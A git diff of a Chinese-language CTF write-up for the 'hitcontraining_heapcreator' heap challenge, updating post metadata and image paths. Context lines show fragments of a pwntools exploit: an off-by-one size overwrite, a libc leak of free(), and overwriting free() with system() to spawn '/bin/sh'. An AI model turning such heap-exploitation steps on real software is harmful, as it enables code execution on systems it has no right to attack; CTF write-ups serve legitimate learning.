@@ -1,7 +1,7 @@
 ---
-title: '{文件名}'
-date: 2024-11-11 13:00:00 +0800
-categories: [uaf,malloc_hook,unsortbin_leaklibc]
+title: 'hitcontraining_heapcreator'
+date: 2024-04-26 13:00:00 +0800
+categories: [uaf,off_by_one,heapoverflow]
 tags: [ctf,pwn]
 ---
  [[BUUCTF](https://buuoj.cn/challenges#hitcontraining_heapcreator)]hitcontraining_heapcreator
@@ -97,7 +97,7 @@ add(0x10,b'/bin/sh\x00')    #3
 edit(0,b'A'*0x18+p8(129))
 ```
 
-![image-20240426165211798](./../../AppData/Roaming/Typora/typora-user-images/image-20240426165211798.png)
+![image-20240426165211798](../assets/img/old_imgs/image-20240426165211798.png)
 
 > 运行后截图
 
@@ -112,15 +112,15 @@ free_addr=u64(io.recvuntil("Done")[:-5].ljust(8,b'\x00'))
 success(hex(free_addr))
 ```
 
-![image-20240426170324709](./../../AppData/Roaming/Typora/typora-user-images/image-20240426170324709.png)
+![image-20240426170324709](../assets/img/old_imgs/image-20240426170324709.png)
 
 > 运行后截图
 
-![image-20240426170524597](./../../AppData/Roaming/Typora/typora-user-images/image-20240426170524597.png)
+![image-20240426170524597](../assets/img/old_imgs/image-20240426170524597.png)
 
 对比可以更改了原来的`BK`伪造出`fake_chunk`，即此时的`chun2`已经是`free()`的地址
 
-![image-20240426171126423](./../../AppData/Roaming/Typora/typora-user-images/image-20240426171126423.png)
+![image-20240426171126423](../assets/img/old_imgs/image-20240426171126423.png)
 
 继续计算出`system()`的值并且替换`free()`
 
@@ -130,7 +130,7 @@ sys_addr = lib.sym['system']+libc_base
 edit(2,p64(sys_addr))
 ```
 
-![image-20240426171632077](./../../AppData/Roaming/Typora/typora-user-images/image-20240426171632077.png)
+![image-20240426171632077](../assets/img/old_imgs/image-20240426171632077.png)
 
 > 测试用多打印一次`chunk2`的内容
 
